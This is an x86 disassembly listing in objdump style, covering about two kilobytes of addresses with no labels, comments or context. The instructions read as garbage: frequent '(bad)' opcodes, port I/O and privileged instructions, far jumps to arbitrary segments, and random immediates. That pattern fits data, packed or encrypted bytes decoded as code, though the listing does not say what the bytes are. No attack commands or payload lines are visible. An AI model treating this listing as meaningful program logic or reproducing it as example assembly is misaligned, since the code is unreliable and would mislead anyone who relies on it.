  41fa3c:	or     edi,edi
  41fa3e:	mov    esi,0x4fada743
  41fa43:	jmp    0x1292dc61
  41fa48:	in     al,0xed
  41fa4a:	fst    DWORD PTR [edi+eiz*2]
  41fa4d:	and    bh,dl
  41fa4f:	jae    0x41facf
  41fa51:	push   ds
  41fa52:	push   es
  41fa53:	test   eax,0x86d79951
  41fa58:	pop    ebx
  41fa59:	mov    WORD PTR [edx+0x3dda54e0],ss
  41fa5f:	jp     0x41fa0e
  41fa61:	mov    al,0xdc
  41fa63:	ret    
  41fa64:	repnz and al,0xfe
  41fa67:	mov    ecx,0x9770d515
  41fa6c:	icebp  
  41fa6d:	cmp    eax,esi
  41fa6f:	inc    ecx
  41fa70:	imul   eax,eax,0xf6082c05
  41fa76:	cwde   
  41fa77:	jecxz  0x41faae
  41fa79:	aad    0xf7
  41fa7b:	dec    edi
  41fa7c:	add    DWORD PTR [ecx+eax*2+0x43],ebp
  41fa80:	sbb    eax,0xa1dae2b6
  41fa85:	and    DWORD PTR [edx+0x1e],0xd2aa67dc
  41fa8c:	ret    
  41fa8d:	mov    al,0x87
  41fa8f:	pop    ds
  41fa90:	xchg   DWORD PTR [edi],ebx
  41fa92:	shl    esp,cl
  41fa94:	inc    esp
  41fa95:	cmp    eax,0xcf68a982
  41fa9a:	xor    BYTE PTR [ebx],cl
  41fa9c:	push   ss
  41fa9d:	daa    
  41fa9e:	fistp  WORD PTR [ecx+0x5ac3e9d2]
  41faa4:	adc    BYTE PTR [ebp+0x4],dl
  41faa7:	cli    
  41faa8:	jno    0x41fafa
  41faaa:	inc    ebp
  41faab:	and    cl,BYTE PTR [esi]
  41faad:	sub    al,BYTE PTR [eax]
  41faaf:	dec    edi
  41fab0:	iret   
  41fab1:	dec    ebp
  41fab2:	lods   al,BYTE PTR ds:[esi]
  41fab3:	xchg   ecx,eax
  41fab4:	stc    
  41fab5:	cdq    
  41fab6:	retf   0xf9b0
  41fab9:	fisub  WORD PTR [edi-0x5d]
  41fabc:	fwait
  41fabd:	shl    BYTE PTR [ebx],cl
  41fabf:	fstp   st(4)
  41fac1:	sbb    al,0x30
  41fac3:	jns    0x41fa50
  41fac5:	sbb    BYTE PTR [edi-0x62658a5e],cl
  41facb:	push   ecx
  41facc:	xor    BYTE PTR [eax+ebp*4-0x77f2f40d],dl
  41fad3:	mov    ecx,0xc8c5268b
  41fad8:	pop    ds
  41fad9:	xchg   ebx,eax
  41fada:	ins    DWORD PTR es:[edi],dx
  41fadb:	cmp    DWORD PTR [ebx],eax
  41fadd:	scas   eax,DWORD PTR es:[edi]
  41fade:	imul   eax,ebp,0x76
  41fae1:	(bad)  
  41fae3:	es xchg edx,eax
  41fae5:	sbb    dl,bh
  41fae7:	xor    ecx,edx
  41fae9:	cmp    BYTE PTR [edi-0x6e17bff5],dh
  41faef:	(bad)  
  41faf0:	jmp    0x41fb1b
  41faf2:	ja     0x41fb25
  41faf4:	add    DWORD PTR [ebp+0x5e],eax
  41faf7:	mov    ds:0x10be0d5b,eax
  41fafc:	mov    BYTE PTR [eax],dh
  41fafe:	cmp    dl,BYTE PTR [ecx+0x4c]
  41fb01:	fld    QWORD PTR ds:0xb3df814d
  41fb07:	dec    esp
  41fb08:	mov    edi,0x5b9c5ddc
  41fb0d:	cmp    ah,ah
  41fb0f:	loopne 0x41fb1e
  41fb11:	call   0x7f89711e
  41fb16:	push   ecx
  41fb17:	icebp  
  41fb18:	xor    eax,0x10605e19
  41fb1d:	dec    edi
  41fb1e:	xor    al,BYTE PTR [edi]
  41fb20:	cld    
  41fb21:	and    BYTE PTR [ebp+edi*4+0x12],ah
  41fb25:	lock mov al,ds:0xd8250c1d
  41fb2b:	mov    eax,ds:0x4bb9aec1
  41fb30:	mov    esi,0x31f13860
  41fb35:	in     eax,0xc8
  41fb37:	cmp    BYTE PTR [ebp+0x6c],bh
  41fb3a:	cwde   
  41fb3b:	cmp    BYTE PTR ds:0xde168c9d,ah
  41fb41:	mov    ds:0x327fcb5b,al
  41fb46:	cmp    DWORD PTR [ecx],esi
  41fb48:	cld    
  41fb49:	icebp  
  41fb4a:	aas    
  41fb4b:	jecxz  0x41fb2e
  41fb4d:	push   0x55958c8f
  41fb52:	std    
  41fb53:	inc    ebp
  41fb54:	or     bl,BYTE PTR [esi-0x2c]
  41fb57:	dec    ebx
  41fb58:	pusha  
  41fb59:	mov    ch,0x6e
  41fb5b:	stos   DWORD PTR es:[edi],eax
  41fb5c:	(bad)  
  41fb5d:	retf   
  41fb5e:	mov    bh,BYTE PTR [eax+0x3c1ec44e]
  41fb64:	sub    edx,ebx
  41fb66:	pop    edi
  41fb67:	sahf   
  41fb68:	cmp    al,0x1d
  41fb6a:	sub    ebp,DWORD PTR [edx-0x49]
  41fb6d:	push   ds
  41fb6e:	aas    
  41fb6f:	jg     0x41fb12
  41fb71:	adc    cl,al
  41fb73:	xchg   edi,eax
  41fb74:	fidiv  DWORD PTR [eax-0x2c724cd2]
  41fb7a:	mov    bl,0xd3
  41fb7c:	mov    al,0x71
  41fb7e:	or     al,0x59
  41fb80:	stc    
  41fb81:	pop    ds
  41fb82:	mov    ebx,0x923f4217
  41fb87:	mov    ebp,0x70c6d434
  41fb8c:	mov    edi,0xc3a5ac2
  41fb91:	icebp  
  41fb92:	jbe    0x41fb3a
  41fb94:	repnz dec ebx
  41fb96:	stos   BYTE PTR es:[edi],al
  41fb97:	scas   al,BYTE PTR es:[edi]
  41fb98:	out    0xaa,al
  41fb9a:	pop    esp
  41fb9b:	or     BYTE PTR [edx],al
  41fb9d:	es push ebp
  41fb9f:	mov    esi,0x72056b6
  41fba4:	aas    
  41fba5:	in     al,0xee
  41fba7:	mov    eax,0x73f9280e
  41fbac:	ror    DWORD PTR [eax+edi*1-0x57],0x12
  41fbb1:	(bad)  
  41fbb2:	jb     0x41fb6d
  41fbb4:	mov    bl,bl
  41fbb6:	jne    0x41fc19
  41fbb8:	pop    ss
  41fbb9:	gs ja  0x41fb47
  41fbbc:	int    0x50
  41fbbe:	stos   BYTE PTR es:[edi],al
  41fbbf:	lock or DWORD PTR ds:0x5d265d0,ebp
  41fbc6:	xchg   esp,eax
  41fbc7:	sbb    DWORD PTR [ebx],ecx
  41fbc9:	inc    edx
  41fbca:	mov    DWORD PTR [ebp+ebp*4+0x26],0x7ac99b3d
  41fbd2:	sub    eax,0x1aac3267
  41fbd7:	lea    esp,[edi-0x4116888]
  41fbdd:	outs   dx,DWORD PTR ds:[esi]
  41fbde:	aam    0x1f
  41fbe0:	xor    al,BYTE PTR cs:[edi]
  41fbe3:	cmc    
  41fbe4:	out    0xdd,al
  41fbe6:	iret   
  41fbe7:	mov    ebx,0xb36c0965
  41fbec:	sar    ebx,0x41
  41fbef:	pop    esi
  41fbf0:	mov    edi,0x67390dc5
  41fbf5:	xor    ebx,DWORD PTR [edi-0x521c94c5]
  41fbfb:	repz and ebx,DWORD PTR [ecx]
  41fbfe:	add    DWORD PTR [esi],edi
  41fc00:	jbe    0x41fba6
  41fc02:	xchg   ebx,eax
  41fc03:	xchg   BYTE PTR [edx+0x12],bh
  41fc06:	inc    ecx
  41fc07:	mov    esi,0xa2362294
  41fc0c:	out    0x29,eax
  41fc0e:	test   al,0x9c
  41fc10:	into   
  41fc11:	cld    
  41fc12:	xor    BYTE PTR [ecx],bh
  41fc14:	es (bad) 
  41fc16:	push   ebx
  41fc17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fc18:	outs   dx,DWORD PTR ds:[esi]
  41fc19:	mov    WORD PTR [eax-0x334963de],fs
  41fc1f:	jae    0x41fc65
  41fc21:	xor    al,0x4c
  41fc23:	cmp    DWORD PTR [ebx+0x1a],0xfffffff6
  41fc27:	out    dx,eax
  41fc28:	(bad)  
  41fc29:	out    dx,al
  41fc2a:	mov    eax,cs:0xd9eaf6a2
  41fc30:	test   al,0x4f
  41fc32:	std    
  41fc33:	inc    eax
  41fc34:	fistp  WORD PTR [esi-0x33d873d9]
  41fc3a:	fdivr  st,st(7)
  41fc3c:	mov    cl,0x5a
  41fc3e:	retf   
  41fc3f:	adc    eax,0x11b20637
  41fc44:	cmc    
  41fc45:	and    ecx,eax
  41fc47:	push   ecx
  41fc48:	adc    eax,0x418bb095
  41fc4d:	lock data16 mov BYTE PTR [ebp-0x4d],ch
  41fc52:	bound  edx,QWORD PTR [esi+0x4f7e6d7]
  41fc58:	(bad)  
  41fc59:	ficomp DWORD PTR [ebx]
  41fc5b:	mov    ecx,0x8f4d6be1
  41fc60:	mov    esp,DWORD PTR [edi+0x39]
  41fc63:	inc    eax
  41fc64:	xor    BYTE PTR [ecx+0x79590b96],cl
  41fc6a:	and    eax,0xefb0350b
  41fc6f:	fimul  WORD PTR [edi-0x11]
  41fc72:	xor    ah,BYTE PTR [eax-0x68]
  41fc75:	lahf   
  41fc76:	test   BYTE PTR [esi],0xc4
  41fc79:	lods   al,BYTE PTR ds:[esi]
  41fc7a:	ins    DWORD PTR es:[edi],dx
  41fc7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fc7c:	cmp    eax,0x73a5891d
  41fc81:	loopne 0x41fc41
  41fc83:	hlt    
  41fc84:	gs enter 0xc9fb,0xa3
  41fc89:	(bad)  
  41fc8a:	jns    0x41fc71
  41fc8c:	add    eax,0x6fa33a41
  41fc91:	sub    al,0xb6
  41fc93:	sub    BYTE PTR [edx],bh
  41fc95:	push   esp
  41fc96:	retf   
  41fc97:	lods   eax,DWORD PTR ds:[esi]
  41fc98:	adc    al,0xb1
  41fc9a:	push   0xd34d5a0f
  41fc9f:	sahf   
  41fca0:	or     BYTE PTR [edi+0x54],0x55
  41fca4:	mov    dh,0xed
  41fca6:	xor    eax,0x8e4dcd2e
  41fcab:	jns    0x41fcee
  41fcad:	mov    ds:0xf6878f7a,eax
  41fcb2:	outs   dx,DWORD PTR ds:[esi]
  41fcb3:	push   esp
  41fcb4:	cmp    DWORD PTR [ebx+0x11416f48],ecx
  41fcba:	std    
  41fcbb:	hlt    
  41fcbc:	xchg   DWORD PTR [ebp+0x14],edi
  41fcbf:	or     BYTE PTR [ebx-0x6b8ada1d],dl
  41fcc5:	jge    0x41fd11
  41fcc7:	dec    ebx
  41fcc8:	or     eax,DWORD PTR [ebx-0x62]
  41fccb:	add    BYTE PTR [eax+0x7dbdcb0d],bl
  41fcd1:	cmp    edx,DWORD PTR [edi+0x5dfa57ef]
  41fcd7:	or     esp,ebp
  41fcd9:	out    dx,al
  41fcda:	push   eax
  41fcdb:	test   DWORD PTR [ebp-0x6aa5bbe2],edx
  41fce1:	mov    dh,0x85
  41fce3:	push   ds
  41fce4:	aad    0xe4
  41fce6:	stos   DWORD PTR es:[edi],eax
  41fce7:	push   ebp
  41fce8:	inc    esi
  41fce9:	adc    esp,DWORD PTR [esi]
  41fceb:	leave  
  41fcec:	iret   
  41fced:	xor    DWORD PTR [ecx-0x540c315d],esp
  41fcf3:	out    0x34,al
  41fcf5:	loope  0x41fcfb
  41fcf7:	bound  esp,QWORD PTR [esi-0x5d]
  41fcfa:	dec    ebp
  41fcfb:	mov    edi,0x49894aca
  41fd00:	xchg   ebp,eax
  41fd01:	and    eax,0x33aa703d
  41fd06:	inc    ebp
  41fd07:	out    0x22,eax
  41fd09:	push   ss
  41fd0a:	mov    WORD PTR [edi],?
  41fd0c:	es in  eax,dx
  41fd0e:	xchg   ebx,eax
  41fd0f:	cmp    DWORD PTR ss:[ecx-0x3511acd3],edx
  41fd16:	mov    DWORD PTR [ebp-0x6c],esp
  41fd19:	mov    ds,WORD PTR [edi]
  41fd1b:	(bad)  
  41fd1c:	test   eax,0x24166290
  41fd21:	std    
  41fd22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fd23:	test   DWORD PTR [ebx],0xf954ab4
  41fd29:	jno    0x41fd1d
  41fd2b:	stc    
  41fd2c:	xchg   esp,eax
  41fd2d:	jbe    0x41fd36
  41fd2f:	add    al,0xf8
  41fd31:	pop    edx
  41fd32:	inc    edx
  41fd33:	xchg   BYTE PTR [edx-0x444d373a],cl
  41fd39:	inc    esp
  41fd3a:	mov    al,ds:0xf726e455
  41fd3f:	sti    
  41fd40:	pusha  
  41fd41:	retf   
  41fd42:	(bad)  
  41fd43:	jmp    0x8393:0xad42ba5b
  41fd4a:	sub    BYTE PTR [edx-0x54],cl
  41fd4d:	xchg   esp,eax
  41fd4e:	cdq    
  41fd4f:	out    0xe7,al
  41fd51:	jb     0x41fd14
  41fd53:	ror    BYTE PTR [edi],0x72
  41fd56:	xchg   edi,eax
  41fd57:	jl     0x41fd58
  41fd59:	outs   dx,DWORD PTR ds:[esi]
  41fd5a:	pop    ss
  41fd5b:	jbe    0x41fd07
  41fd5d:	xchg   eax,esp
  41fd5f:	and    eax,0xf618f337
  41fd64:	and    eax,DWORD PTR [esi-0x7ebb29fb]
  41fd6a:	sub    al,0x41
  41fd6c:	(bad)  
  41fd6d:	xlat   BYTE PTR ds:[ebx]
  41fd6e:	clc    
  41fd6f:	dec    ebx
  41fd70:	ja     0x41fd9d
  41fd72:	xchg   DWORD PTR ds:0x7ff9ed80,ecx
  41fd78:	push   ss
  41fd79:	test   DWORD PTR [ebp-0x5e67a4e0],0xae157600
  41fd83:	rol    BYTE PTR [ecx],0xb4
  41fd86:	cmp    BYTE PTR [eax+edi*4],bh
  41fd89:	inc    ebx
  41fd8a:	jmp    0x41fdba
  41fd8c:	arpl   WORD PTR [esi+0x53],ax
  41fd8f:	inc    ecx
  41fd90:	add    eax,0x3cad7213
  41fd95:	div    edi
  41fd97:	retf   
  41fd98:	push   edi
  41fd99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fd9b:	inc    esp
  41fd9c:	inc    edi
  41fd9d:	pusha  
  41fd9e:	mov    al,ds:0xa2aacbec
  41fda3:	mov    esp,0x430cdc4
  41fda8:	inc    esp
  41fda9:	jae    0x41fd64
  41fdab:	call   0xbe2b:0x4dc57ff3
  41fdb2:	dec    edx
  41fdb3:	fcmovnb st,st(6)
  41fdb5:	setge  BYTE PTR [esi-0x6d]
  41fdb9:	mov    cl,0x16
  41fdbb:	sbb    eax,0x368afe02
  41fdc0:	mov    DWORD PTR [edx+0x8],ebx
  41fdc3:	push   ebp
  41fdc4:	jne    0x41fdfe
  41fdc6:	adc    DWORD PTR [edx+0x66],ecx
  41fdc9:	add    al,BYTE PTR [ecx]
  41fdcb:	or     eax,0xa8f4044f
  41fdd0:	xor    edi,DWORD PTR [esi]
  41fdd2:	aam    0x15
  41fdd4:	or     al,0x96
  41fdd6:	push   0xcd11cc2
  41fddb:	div    DWORD PTR [esi+edx*1]
  41fdde:	xlat   BYTE PTR ds:[ebx]
  41fddf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fde0:	inc    eax
  41fde1:	xchg   BYTE PTR [eax],al
  41fde3:	adc    al,bl
  41fde5:	dec    esp
  41fde6:	mov    esp,0x5188ced8
  41fdeb:	and    DWORD PTR [ebx+0x1778557d],0x71ee8b0f
  41fdf5:	and    eax,0xef5ac722
  41fdfa:	xor    BYTE PTR [ebx+0x7a],ch
  41fdfd:	push   edi
  41fdfe:	jl     0x41fd8a
  41fe00:	das    
  41fe01:	adc    al,0x58
  41fe03:	add    dh,BYTE PTR [ecx+ebx*1]
  41fe06:	jmp    0x93ef:0x6762fa79
  41fe0d:	xor    al,0x2e
  41fe0f:	and    eax,0x85b135bd
  41fe14:	loop   0x41fdf7
  41fe16:	mov    ah,0x1b
  41fe18:	xchg   eax,eax
  41fe1a:	and    eax,0x2bc98b66
  41fe1f:	xor    eax,0xe6d8a3f7
  41fe24:	mov    cl,BYTE PTR [ebp-0x5bb12698]
  41fe2a:	sahf   
  41fe2b:	mov    cl,0xf2
  41fe2d:	and    eax,0x3141aa54
  41fe32:	cs fs (bad) 
  41fe35:	sub    DWORD PTR [ebx],ebx
  41fe37:	xchg   esi,eax
  41fe38:	ror    BYTE PTR [esi+eiz*2+0x14],0xe
  41fe3d:	test   al,0x14
  41fe3f:	cmp    DWORD PTR [ecx-0xf],esi
  41fe42:	es mov edi,0xd9e71f8e
  41fe48:	add    al,0x47
  41fe4a:	(bad)  
  41fe4b:	call   0xb0ee:0x735a7496
  41fe52:	jbe    0x41fe11
  41fe54:	test   DWORD PTR [ebp+0x1295460],esp
  41fe5a:	(bad)  
  41fe5b:	jle    0x41fe0f
  41fe5d:	hlt    
  41fe5e:	ret    
  41fe5f:	push   esi
  41fe60:	xor    ch,0x4
  41fe63:	pop    ebp
  41fe64:	dec    edx
  41fe65:	fst    QWORD PTR [ecx]
  41fe67:	aas    
  41fe68:	fisubr DWORD PTR [edi]
  41fe6a:	jp     0x41fe7e
  41fe6c:	add    DWORD PTR [eax-0x5e],edi
  41fe6f:	pop    ecx
  41fe70:	xchg   ebx,eax
  41fe71:	xor    DWORD PTR [edx],edi
  41fe73:	pusha  
  41fe74:	mov    eax,ds:0x2723e184
  41fe79:	push   0xb0dc4e34
  41fe7e:	sub    dh,BYTE PTR [edi-0x41]
  41fe81:	jmp    0x41fe64
  41fe83:	or     al,0x8
  41fe85:	test   bh,bh
  41fe87:	dec    ecx
  41fe88:	push   0xc661126f
  41fe8d:	jnp    0x41fe29
  41fe8f:	push   0x3dfe0acc
  41fe94:	jo     0x41fe21
  41fe96:	mov    bh,0x94
  41fe98:	cmp    esi,DWORD PTR [ecx-0x7d30c38f]
  41fe9e:	push   eax
  41fe9f:	jns    0x41feb3
  41fea1:	shr    DWORD PTR [edi+0x1d63ac33],cl
  41fea7:	daa    
  41fea8:	or     DWORD PTR [eax+edi*8],eax
  41feab:	jle    0x41fe9d
  41fead:	test   eax,0x79957843
  41feb2:	pop    ebx
  41feb3:	xchg   esi,eax
  41feb4:	push   ebp
  41feb5:	rol    BYTE PTR [ecx+0x798122b8],1
  41febb:	loope  0x41ff1e
  41febd:	cmp    cl,BYTE PTR [edx+0x19]
  41fec0:	xchg   ebx,eax
  41fec1:	sbb    eax,0x451c763b
  41fec6:	cmc    
  41fec7:	mov    ds:0x770b0db3,eax
  41fecc:	imul   ecx,DWORD PTR [ebx],0xffffff85
  41fecf:	add    eax,0xbb524405
  41fed4:	scas   al,BYTE PTR es:[edi]
  41fed5:	ret    0x70f1
  41fed8:	test   al,0xf0
  41feda:	ss ret 0x33c5
  41fede:	and    al,0x46
  41fee0:	call   0xb53e:0x9ec56b1e
  41fee7:	or     edx,DWORD PTR [edx-0x726e3c1d]
  41feed:	div    BYTE PTR [edi+0x7faab6fd]
  41fef3:	daa    
  41fef4:	dec    ebp
  41fef5:	and    DWORD PTR [edx],ebp
  41fef7:	int    0x4c
  41fef9:	scas   eax,DWORD PTR es:[edi]
  41fefa:	stos   BYTE PTR es:[edi],al
  41fefb:	xchg   DWORD PTR [ecx],ebp
  41fefd:	adc    ebp,0xe121ce4f
  41ff03:	or     ch,ah
  41ff05:	mov    DWORD PTR [esi+0x603c15a6],esp
  41ff0b:	add    DWORD PTR [ebp+0x46],ebx
  41ff0e:	(bad)  
  41ff0f:	cld    
  41ff10:	pop    ecx
  41ff11:	out    dx,al
  41ff12:	icebp  
  41ff13:	data16 sbb bl,bh
  41ff16:	mov    eax,ds:0x35fe9a66
  41ff1b:	loop   0x41ff14
  41ff1d:	es push esi
  41ff1f:	cmp    BYTE PTR [edi+0x18e6a4f7],0xea
  41ff26:	jmp    0xb406:0xd886173e
  41ff2d:	inc    dh
  41ff2f:	gs clc 
  41ff31:	test   BYTE PTR [eax],dl
  41ff33:	mov    WORD PTR [ecx],es
  41ff35:	addr16 call 0xbbdf722c
  41ff3b:	int    0x84
  41ff3d:	bound  edi,QWORD PTR [eax+eax*4+0x42]
  41ff41:	idiv   DWORD PTR [ebp+0x68d218de]
  41ff47:	pop    edx
  41ff48:	xchg   esp,eax
  41ff49:	add    al,0xa1
  41ff4b:	rol    DWORD PTR [eax-0x12],0xee
  41ff4f:	dec    esi
  41ff50:	dec    edi
  41ff51:	mov    DWORD PTR [eax],0x19f17eb
  41ff57:	cli    
  41ff58:	dec    esi
  41ff59:	mov    ch,0x2
  41ff5b:	adc    al,BYTE PTR [esi]
  41ff5d:	fmul   DWORD PTR [ebx]
  41ff5f:	pop    esp
  41ff60:	clc    
  41ff61:	(bad)
  41ff64:	sub    edx,DWORD PTR [ecx+ecx*8+0x64]
  41ff68:	cmp    DWORD PTR [ecx],0x7f2f3cc1
  41ff6e:	sbb    al,BYTE PTR [ecx+0x23]
  41ff71:	inc    esp
  41ff72:	(bad)  
  41ff73:	jno    0x41ffbe
  41ff75:	das    
  41ff76:	dec    edi
  41ff77:	sub    al,0x85
  41ff79:	fild   QWORD PTR [edx+0xb9e4d1c]
  41ff7f:	jmp    0x9474:0x47d5e03b
  41ff86:	pop    ebp
  41ff87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ff88:	gs enter 0x5fbd,0xd7
  41ff8d:	bound  ebp,QWORD PTR ds:0x5db241e8
  41ff93:	mov    esi,0xa03df5a9
  41ff98:	push   ecx
  41ff99:	rcl    DWORD PTR ds:0xbac64667,cl
  41ff9f:	rol    BYTE PTR [edx-0x6d],0xf5
  41ffa3:	adc    eax,0xebbdb5b7
  41ffa8:	fild   QWORD PTR [edx-0x22]
  41ffab:	add    eax,0x3022625a
  41ffb0:	xchg   BYTE PTR [ecx-0x13d8dc56],bh
  41ffb6:	int    0x4a
  41ffb8:	ins    BYTE PTR es:[edi],dx
  41ffb9:	add    DWORD PTR [edx-0x4],0x13
  41ffbd:	adc    bh,BYTE PTR [edi]
  41ffbf:	daa    
  41ffc0:	sub    eax,0x8a11dbe4
  41ffc5:	pop    ds
  41ffc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ffc7:	ja     0x41ff50
  41ffc9:	pusha  
  41ffca:	ds mov ecx,0x7a2b1205
  41ffd0:	mov    dh,0x6f
  41ffd2:	mov    cl,bh
  41ffd4:	push   ebp
  41ffd5:	popa   
  41ffd6:	fst    DWORD PTR [eax+esi*2-0x12]
  41ffda:	xchg   edi,eax
  41ffdb:	(bad)  
  41ffdd:	hlt    
  41ffde:	fnsave [ebp-0x13]
  41ffe1:	or     eax,0xcf977364
  41ffe6:	xor    ch,BYTE PTR [ecx+0x7e5e5a21]
  41ffec:	inc    ebp
  41ffed:	not    BYTE PTR [edx-0x24083b5b]
  41fff3:	and    ebx,0x745600fc
  41fff9:	xchg   ecx,esp
  41fffb:	call   0x42ca781
  420000:	mov    al,0x16
  420002:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420003:	adc    esp,ebp
  420005:	ins    BYTE PTR es:[edi],dx
  420006:	adc    BYTE PTR [ebx-0x50],0xba
  42000a:	adc    al,BYTE PTR fs:[ecx-0x697fa223]
  420011:	outs   dx,DWORD PTR ds:[esi]
  420012:	cmp    eax,0x4e002f10
  420017:	dec    ecx
  420018:	stc    
  420019:	call   0xf48df2e5
  42001e:	jmp    0x7eea770
  420023:	dec    ebx
  420024:	jg     0x420001
  420026:	nop
  420027:	sbb    bl,0x1d
  42002a:	mov    al,0x4d
  42002c:	cmc    
  42002d:	or     al,0x21
  42002f:	inc    esp
  420030:	mov    ds:0x23a24b63,eax
  420035:	aaa    
  420036:	popa   
  420037:	lods   eax,DWORD PTR ds:[esi]
  420038:	ins    BYTE PTR es:[edi],dx
  420039:	cs sti 
  42003b:	cwde   
  42003c:	push   es
  42003d:	mov    esp,ebx
  42003f:	das    
  420040:	out    0x32,al
  420042:	adc    eax,0xaa19a3f4
  420047:	ins    BYTE PTR es:[edi],dx
  420048:	dec    esp
  420049:	inc    ebx
  42004a:	cs pusha 
  42004c:	lahf   
  42004d:	and    eax,0xa0e9dad1
  420052:	test   al,0xc1
  420054:	mov    edx,DWORD PTR [eax]
  420056:	lock cmp al,0xa0
  420059:	ins    BYTE PTR es:[edi],dx
  42005a:	inc    edi
  42005b:	xchg   esi,eax
  42005c:	mov    dh,al
  42005e:	and    eax,0x49974c42
  420063:	repnz mov BYTE PTR [eax+0x18],al
  420067:	int3   
  420068:	std    
  420069:	in     al,dx
  42006a:	inc    sp
  42006c:	pop    esi
  42006d:	out    dx,al
  42006e:	or     DWORD PTR [eax-0x3cdf0e00],eax
  420074:	inc    ebp
  420075:	xchg   esp,eax
  420076:	mov    edi,0x2d95c67f
  42007b:	rol    ecx,cl
  42007d:	push   es
  42007e:	scas   eax,DWORD PTR es:[edi]
  42007f:	cmp    al,0x6c
  420081:	cmp    BYTE PTR [eax+0x3c2cf8e9],0x7d
  420088:	pop    ecx
  420089:	jbe    0x420070
  42008b:	daa    
  42008c:	adc    al,0x1f
  42008e:	icebp  
  42008f:	xchg   edx,eax
  420090:	adc    ebp,DWORD PTR [eax-0x43]
  420093:	fnstcw WORD PTR [ebx]
  420095:	or     ecx,esi
  420097:	pop    ss
  420098:	sub    BYTE PTR [ecx+0x20],bh
  42009b:	out    dx,eax
  42009c:	jae    0x4200df
  42009e:	pop    esi
  42009f:	aam    0x5d
  4200a1:	in     eax,dx
  4200a2:	jo     0x420121
  4200a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4200a5:	push   ss
  4200a6:	arpl   WORD PTR [ebx],ax
  4200a8:	(bad)  
  4200a9:	mov    WORD PTR [edi+0x3e8242d2],ds
  4200af:	dec    edx
  4200b0:	dec    esp
  4200b1:	xchg   edi,eax
  4200b2:	mov    dh,0x8c
  4200b4:	sti    
  4200b5:	(bad)  
  4200b6:	test   eax,0x1859d1fc
  4200bb:	sub    ebx,ebx
  4200bd:	inc    esi
  4200be:	sub    al,0x7c
  4200c0:	pop    esi
  4200c1:	hlt    
  4200c2:	aas    
  4200c3:	jp     0x4200d0
  4200c5:	dec    DWORD PTR [edi]
  4200c7:	ds in  al,dx
  4200c9:	dec    edi
  4200ca:	fwait
  4200cb:	loope  0x420059
  4200cd:	int3   
  4200ce:	ins    BYTE PTR es:[edi],dx
  4200cf:	int3   
  4200d0:	xlat   BYTE PTR ds:[ebx]
  4200d1:	pop    edx
  4200d2:	dec    ebx
  4200d3:	not    BYTE PTR [esi-0x1c]
  4200d6:	push   cs
  4200d7:	and    BYTE PTR [esi-0x1b9351f3],cl
  4200dd:	ret    
  4200de:	test   BYTE PTR [eax+eiz*8],bl
  4200e1:	aas    
  4200e2:	cmc    
  4200e3:	leave  
  4200e4:	push   eax
  4200e5:	cdq    
  4200e6:	in     eax,0x86
  4200e8:	rcr    ah,0xe0
  4200eb:	mov    edi,cs
  4200ed:	je     0x420127
  4200ef:	inc    edx
  4200f0:	dec    ebp
  4200f1:	xchg   BYTE PTR [ecx+0x278a1906],ch
  4200f7:	pushf  
  4200f8:	mov    BYTE PTR [edi],0x69
  4200fb:	jge    0x420145
  4200fd:	dec    edi
  4200fe:	into   
  4200ff:	mov    ebp,0xe09711e0
  420104:	cmp    dl,BYTE PTR [edi+eiz*2]
  420107:	mov    edx,0x675b2118
  42010c:	push   ecx
  42010d:	fisttp QWORD PTR fs:[edx-0x12b5f8ae]
  420114:	cmp    BYTE PTR [esp+eax*8+0x363a51fa],bl
  42011b:	enter  0xaa6,0xea
  42011f:	retf   
  420120:	push   0xffffffa8
  420122:	in     al,0xd6
  420124:	jmp    0x420143
  420126:	fs (bad) 
  420128:	jecxz  0x42016c
  42012a:	mov    ecx,0xa768e54
  42012f:	pop    edi
  420130:	inc    edx
  420131:	out    0xd6,eax
  420133:	jl     0x420173
  420135:	push   edi
  420136:	loop   0x4200f3
  420138:	clc    
  420139:	or     BYTE PTR [ebx+0x226e467b],dl
  42013f:	mov    BYTE PTR [edx-0x203b23a7],al
  420145:	std    
  420146:	ror    eax,1
  420148:	setne  BYTE PTR [esi+ebp*2]
  42014c:	dec    esi
  42014d:	loope  0x4200f7
  42014f:	fild   QWORD PTR [edx-0x62]
  420152:	add    dl,cl
  420154:	(bad)  [edx+0x43]
  420157:	jecxz  0x4200e3
  420159:	jnp    0x4201b6
  42015b:	imul   ecx
  42015d:	mov    ecx,0xda99dd86
  420162:	shr    DWORD PTR ds:0xf448b83f,1
  420168:	xchg   DWORD PTR [esi-0x77],edx
  42016b:	pop    esi
  42016c:	cwde   
  42016d:	dec    edi
  42016e:	gs loop 0x4201e0
  420171:	adc    ecx,DWORD PTR [esi-0x12]
  420174:	mov    WORD PTR [edx],ss
  420176:	mov    esp,0x1da57486
  42017b:	enter  0x5c19,0xe3
  42017f:	fmul   DWORD PTR [ebx-0x2cece119]
  420185:	(bad)  
  420187:	xor    ah,BYTE PTR [eax+edi*8-0x77]
  42018b:	cmp    eax,0x586da0a5
  420190:	mov    al,0x78
  420192:	(bad)  
  420193:	not    ah
  420195:	(bad)  
  420197:	(bad)  
  420198:	cmp    BYTE PTR [eax-0x3ab071e4],dl
  42019e:	dec    edx
  42019f:	rcl    bh,1
  4201a1:	push   ecx
  4201a2:	(bad)
  4201a5:	stos   DWORD PTR es:[edi],eax
  4201a6:	sub    BYTE PTR [edi+0x420f8997],cl
  4201ac:	std    
  4201ad:	cmp    al,0x55
  4201af:	arpl   WORD PTR [ecx],di
  4201b1:	jle    0x4201bc
  4201b3:	stc    
  4201b4:	dec    ecx
  4201b5:	aad    0x89
  4201b7:	dec    esp
  4201b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4201b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4201ba:	inc    ebp
  4201bb:	das    
  4201bc:	adc    al,0xd8
  4201be:	test   eax,0x32c1f180
  4201c3:	push   edi
  4201c4:	ret    0x72a
  4201c7:	mov    esp,0x8853217b
  4201cc:	mov    eax,ds:0xba47fbc2
  4201d1:	push   edi
  4201d2:	or     cl,BYTE PTR [ebp+0x327f6d57]
